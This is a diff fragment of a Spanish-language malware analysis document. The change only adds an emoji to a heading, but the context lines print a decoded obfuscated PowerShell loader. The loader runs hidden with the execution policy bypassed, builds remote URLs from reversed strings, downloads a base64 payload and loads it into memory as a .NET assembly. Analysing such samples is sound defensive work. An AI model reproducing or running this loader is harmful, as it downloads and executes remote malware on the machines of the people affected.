@@ -19,7 +19,7 @@ powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command
 
 
 
-## El base 64 decodificado:
+## :mage_man: El base 64 decodificado:
 ```
 powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -NoProfile -Command
 $dll = '0/8JMh1/r/ee.etsap//:sptth';$RumpeD = (New-Object Net.WebClient).DownloadString( $dll[-1..-$dll.Length] -join '' );[Byte[]] $Rumpe = [System.Convert]::FromBase64String( $RumpeD[-1..-$RumpeD.Length] -join '' );[Reflection.Assembly]::Load($Rumpe).GetType('ent.Class1').GetMethod('Run').Invoke($null, [object[]] ('txt.26602408211/sbv/erots.sbvle//:ptth'))9h
